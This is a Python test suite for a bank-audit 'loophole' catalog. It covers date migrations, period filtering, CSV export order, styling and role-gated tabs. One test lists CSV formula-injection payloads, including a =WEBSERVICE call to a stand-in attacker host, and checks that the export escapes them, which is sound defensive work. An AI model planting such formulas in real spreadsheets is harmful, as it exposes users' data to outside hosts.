"""Контракты данных финального интерфейса модуля «Лазейки»."""

from __future__ import annotations

import csv
import io
import re
from datetime import UTC, date, datetime
from pathlib import Path

from sqlalchemy import text

from bank_audit.hashing import sha256_text
from bank_audit.loophole import authorization
from bank_audit.loophole import repository as repo
from bank_audit.loophole.models import ExportRequest, LoopholeRecord
from bank_audit.loophole.web import export

ROOT = Path(__file__).resolve().parents[2]
MIGRATION = ROOT / "migrations" / "058_loophole_publication_date.sql"
CSS = ROOT / "src" / "bank_audit" / "loophole" / "static" / "loophole.css"
JSX = ROOT / "src" / "bank_audit" / "loophole" / "static" / "loophole.jsx"


def test_publication_date_migration_is_nullable_and_has_no_synthetic_default():
    """Мутация, которую ловит тест: published_at подменяется временем сбора."""
    sql = MIGRATION.read_text(encoding="utf-8")
    normalized = " ".join(sql.split()).lower()

    assert "alter table loophole_record add column if not exists published_at timestamptz" in normalized
    published_clause = normalized.split("published_at timestamptz", 1)[1].split(";", 1)[0]
    assert "default" not in published_clause
    assert "not null" not in published_clause


def test_publication_date_round_trips_without_filling_unknown_value(session):
    """Известная дата сохраняется, неизвестная остаётся NULL."""
    published_at = datetime(2026, 8, 27, 9, 25, tzinfo=UTC)
    known_id = repo.insert_record(
        LoopholeRecord(
            sha256=sha256_text("published-known"),
            title="Дата известна",
            published_at=published_at,
        ),
        session=session,
    )
    unknown_id = repo.insert_record(
        LoopholeRecord(
            sha256=sha256_text("published-unknown"),
            title="Дата неизвестна",
            published_at=None,
        ),
        session=session,
    )

    records = {record["record_id"]: record for record in repo.list_records(session=session)}

    assert str(records[known_id]["published_at"]).startswith("2026-08-27 09:25:00")
    assert records[unknown_id]["published_at"] is None
    assert records[unknown_id]["collected_at"] is not None


def test_catalog_period_uses_source_publication_date_and_includes_last_day(session):
    """Период каталога отсеивает по дате первоисточника, не по времени сбора."""
    in_period_id = repo.insert_record(
        LoopholeRecord(sha256=sha256_text("published-in-period"), title="Август"),
        session=session,
    )
    older_id = repo.insert_record(
        LoopholeRecord(sha256=sha256_text("published-before-period"), title="Июль"),
        session=session,
    )
    session.execute(
        text(
            "UPDATE loophole_record SET published_at = :published_at, "
            "collected_at = :collected_at WHERE record_id = :record_id"
        ),
        {
            "record_id": in_period_id,
            "published_at": datetime(2026, 8, 31, 23, 59, tzinfo=UTC),
            "collected_at": datetime(2026, 7, 1, tzinfo=UTC),
        },
    )
    session.execute(
        text(
            "UPDATE loophole_record SET published_at = :published_at, "
            "collected_at = :collected_at WHERE record_id = :record_id"
        ),
        {
            "record_id": older_id,
            "published_at": datetime(2026, 7, 31, 23, 59, tzinfo=UTC),
            "collected_at": datetime(2026, 8, 15, tzinfo=UTC),
        },
    )
    session.flush()

    records = repo.list_records(
        period_from=date(2026, 8, 1),
        period_to=date(2026, 8, 31),
        session=session,
    )

    assert {record["record_id"] for record in records} == {in_period_id}


def test_catalog_period_controls_name_source_publication_date():
    jsx = JSX.read_text(encoding="utf-8")

    assert "Дата публикации — с" in jsx
    assert "Дата публикации — по" in jsx
    assert "Период сбора" not in jsx


def test_record_boolean_is_normalized_for_browser_json_on_sqlite(session):
    """Локальный full-shell должен получать boolean, а не SQLite integer."""
    record_id = repo.insert_record(
        LoopholeRecord(
            sha256=sha256_text("browser-json-boolean"),
            title="Булев вердикт",
            is_loophole=True,
        ),
        session=session,
    )

    record = next(
        row for row in repo.list_records(session=session) if row["record_id"] == record_id
    )

    assert record["is_loophole"] is True


def test_selected_checkbox_uses_auditlens_accent_color():
    """Выбор строк не должен откатываться к синему системному checkbox."""
    css = CSS.read_text(encoding="utf-8")
    rule = re.search(r"\.lp-checkbox-hit input\s*\{(?P<body>[^}]*)\}", css)

    assert rule is not None
    assert "accent-color: var(--accent)" in rule.group("body")


def test_selected_csv_contains_both_dates_and_never_exposes_internal_trust(session):
    """CSV передаёт выбранные ID, две даты и не раскрывает trust_score."""
    first_id = repo.insert_record(
        LoopholeRecord(
            sha256=sha256_text("selected-first"),
            title="Первая выбранная",
            published_at=datetime(2026, 8, 25, 14, 32, tzinfo=UTC),
            trust_score=0.91,
            status="published",
            is_loophole=True,
        ),
        session=session,
    )
    second_id = repo.insert_record(
        LoopholeRecord(
            sha256=sha256_text("selected-second"),
            title="Вторая выбранная",
            published_at=None,
            trust_score=0.44,
            status="published",
            is_loophole=True,
        ),
        session=session,
    )

    response = export(
        ExportRequest(records=[second_id, first_id], format="csv"),
        user_id="auditor",
        session=session,
    )
    reader = csv.DictReader(io.StringIO(response.body.decode("utf-8-sig")))
    rows = list(reader)

    assert reader.fieldnames is not None
    assert "published_at" in reader.fieldnames
    assert "collected_at" in reader.fieldnames
    assert reader.fieldnames.index("published_at") < reader.fieldnames.index("collected_at")
    assert "trust_score" not in reader.fieldnames
    assert [int(row["record_id"]) for row in rows] == [second_id, first_id]
    assert rows[0]["published_at"] == ""
    assert rows[1]["published_at"].startswith("2026-08-25 14:32:00")


def test_selected_export_skips_records_outside_catalog_and_preserves_requested_order(session):
    """Мутации фильтра published/is_loophole или сортировка ID делают тест красным."""
    first_id = repo.insert_record(
        LoopholeRecord(
            sha256=sha256_text("export-valid-first"),
            title="Допустимая первая",
            status="published",
            is_loophole=True,
        ),
        session=session,
    )
    draft_id = repo.insert_record(
        LoopholeRecord(
            sha256=sha256_text("export-draft"),
            title="Неопубликованная",
            status="classified",
            is_loophole=True,
        ),
        session=session,
    )
    rejected_id = repo.insert_record(
        LoopholeRecord(
            sha256=sha256_text("export-not-loophole"),
            title="Не лазейка",
            status="published",
            is_loophole=False,
        ),
        session=session,
    )
    second_id = repo.insert_record(
        LoopholeRecord(
            sha256=sha256_text("export-valid-second"),
            title="Допустимая вторая",
            status="published",
            is_loophole=True,
        ),
        session=session,
    )

    response = export(
        ExportRequest(
            records=[draft_id, second_id, 999_999, rejected_id, first_id],
            format="csv",
        ),
        user_id="auditor",
        session=session,
    )
    rows = list(csv.DictReader(io.StringIO(response.body.decode("utf-8-sig"))))

    assert [int(row["record_id"]) for row in rows] == [second_id, first_id]
    assert [row["title"] for row in rows] == ["Допустимая вторая", "Допустимая первая"]


def test_selected_csv_escapes_formula_prefixes_after_leading_whitespace(session):
    """Каждая строковая ячейка CSV закрыта от формул, включая пробелы и табы."""
    dangerous = {
        "title": " \t=2+2",
        "url": "+SUM(1,1)",
        "domain": "\t-10+5",
        "bank_slug": " @bank",
        "keyword": "=WEBSERVICE(\"https://evil.example\")",
        "verdict_reason": "\t+1",
        "verdict_model": "-formula-model",
        "content_status": " =content",
        "raw_text": "@payload",
    }
    record_id = repo.insert_record(
        LoopholeRecord(
            sha256=sha256_text("export-formula-injection"),
            title=dangerous["title"],
            url=dangerous["url"],
            domain=dangerous["domain"],
            bank_slug=dangerous["bank_slug"],
            keyword=dangerous["keyword"],
            raw_text=dangerous["raw_text"],
            content_status=dangerous["content_status"],
            raw_text_len=len(dangerous["raw_text"]),
            status="published",
            is_loophole=True,
        ),
        session=session,
    )
    session.execute(
        text(
            "UPDATE loophole_record "
            "SET verdict_reason = :reason, verdict_model = :model "
            "WHERE record_id = :record_id"
        ),
        {
            "reason": dangerous["verdict_reason"],
            "model": dangerous["verdict_model"],
            "record_id": record_id,
        },
    )

    response = export(
        ExportRequest(records=[record_id], format="csv"),
        user_id="auditor",
        session=session,
    )
    assert response.body.startswith(b"\xef\xbb\xbf")
    reader = csv.DictReader(io.StringIO(response.body.decode("utf-8-sig")))
    row = next(reader)

    assert reader.fieldnames is not None
    assert "published_at" in reader.fieldnames
    assert "collected_at" in reader.fieldnames
    assert "trust_score" not in reader.fieldnames
    for field, original in dangerous.items():
        assert row[field] == "'" + original


def test_contexts_follow_final_order_and_keep_protected_tabs_role_gated(session):
    """Новая общая вкладка не меняет fail-closed видимость queue/admin."""
    assert authorization.available_contexts("auditor", session=session) == [
        {"id": "catalog", "title": "Общая база"},
        {"id": "sources", "title": "Добавить источник"},
        {"id": "ai_research", "title": "Новое AI-исследование"},
    ]

    session.execute(
        text(
            "INSERT INTO loophole_workspace_membership (username, status) "
            "VALUES ('expert-admin', 'active')"
        )
    )
    session.execute(
        text(
            "INSERT INTO loophole_role_assignment (username, role, status) "
            "VALUES ('expert-admin', 'ccks_expert', 'active'), "
            "('expert-admin', 'module_admin', 'active')"
        )
    )

    assert authorization.available_contexts("expert-admin", session=session) == [
        {"id": "catalog", "title": "Общая база"},
        {"id": "sources", "title": "Добавить источник"},
        {"id": "ai_research", "title": "Новое AI-исследование"},
        {"id": "queue", "title": "Очередь верификации"},
        {"id": "admin", "title": "Управление доступом"},
    ]
